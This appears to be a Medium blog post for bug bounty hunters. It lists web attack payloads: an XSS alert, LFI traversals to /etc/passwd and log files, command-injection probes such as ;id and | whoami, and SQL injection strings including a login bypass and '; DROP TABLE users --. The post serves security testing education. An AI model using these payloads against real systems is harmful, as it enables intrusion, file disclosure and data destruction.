# :globe_with_meridians: Mastering Payloads For Web Application Security Xss Lfi Rce And Sql Injection 20

---

```
<svg onload="alert('XSS')">
```

This payload is used for a reflected XSS attack. When this payload is executed, an alert message with “XSS” is displayed. This payload can be used to test whether the application is vulnerable to XSS attacks or not.

## Get Security Lit Limited’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

For example, if a website is vulnerable to reflected XSS attacks, the following code can be used to execute this payload:

```
<svg onload="alert('XSS')">
```

In addition to these XSS payloads, here are some powerful payloads that can be used for LFI, RCE, and SQL injection attacks.

### LFI Payloads

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../var/log/auth.log
../../../../var/log/auth.log
../../../var/log/apache2/access.log
../../../../var/log/apache2/access.log
```

These payloads are used for Local File Inclusion (LFI) attacks. These attacks allow an attacker to read sensitive files from the server. These payloads can be used to test whether the application is vulnerable to LFI attacks or not.

### RCE Payloads

```
;id
|id
&& id
$(id)
id
{id}
```

These payloads are used for Remote Code Execution (RCE) attacks. These attacks allow an attacker to execute arbitrary code on the server. These payloads can be used to test whether the application is vulnerable to RCE attacks or not.

### SQL Injection Payloads

```
' or 1=1--
" or 1=1--
' union select 1,2,3--
" union select 1,2,3--
' union select null,version(),null--
" union select null,version(),null--

```

These payloads are used for SQL injection attacks. These attacks allow an attacker to extract sensitive information from the database or modify the database.

### Remote Code Execution (RCE) payloads

Remote Code Execution (RCE) vulnerabilities are critical security issues that allow attackers to execute code on a vulnerable server or application. This type of vulnerability can allow an attacker to take full control of a system, including stealing sensitive data or installing malware. Here are some common RCE payloads that you can use during bug bounty hunting:

- `;ls` – This payload can be used to list the contents of a directory on a Unix-based system. For example, an attacker can inject this payload into a vulnerable application to view the files and directories on the target system.

- `| whoami` – This payload can be used to find the username of the current user on a Unix-based system. For example, an attacker can inject this payload into a vulnerable application to determine the user that the application is running as.

- `;net user` – This payload can be used to list the users on a Windows-based system. For example, an attacker can inject this payload into a vulnerable application to view the user accounts on the target system.

- `& netstat -an` – This payload can be used to display active network connections on a Windows-based system. For example, an attacker can inject this payload into a vulnerable application to view the open ports and active connections on the target system.

### SQL Injection (SQLi) payloads

SQL Injection (SQLi) is a type of web application vulnerability that allows an attacker to execute malicious SQL statements against a database. SQLi vulnerabilities can allow attackers to access sensitive data or modify database content. Here are some common SQLi payloads that you can use during bug bounty hunting:

- `' or 1=1 --` – This payload can be used to bypass authentication by injecting a SQL statement that always evaluates to true. For example, an attacker can inject this payload into a login form to log in as any user without knowing their password.

- `'; DROP TABLE users --` – This payload can be used to drop a database table by injecting a SQL statement that deletes the target table. For example, an attacker can inject this payload into a vulnerable application to delete the entire user database.

- `1;SELECT * FROM users; --` – This payload can be used to extract data from a database by injecting a SQL statement that selects all records from a table. For example, an attacker can inject this payload into a vulnerable application to view the usernames and passwords of all users.

### Conclusion:

[Payloads](https://thoughttide.com/payloads-for-bug-bounty-hunters-a-beginners-guide/)are essential tools for bug bounty hunters to test for vulnerabilities in web applications. By understanding the different types of payloads and their uses, you can improve your chances of finding critical security issues and earning rewards. It’s important to note that while these payloads can be powerful, they should always be used ethically and responsibly. As a bug bounty hunter, you have a responsibility to follow the rules and guidelines of the programs you participate in and to report vulnerabilities in a responsible manner. Happy hunting!

For a list of payloads check out

[https://thoughttide.com/payloads-for-bug-bounty-hunters-a-beginners-guide/](https://thoughttide.com/payloads-for-bug-bounty-hunters-a-beginners-guide/)

---
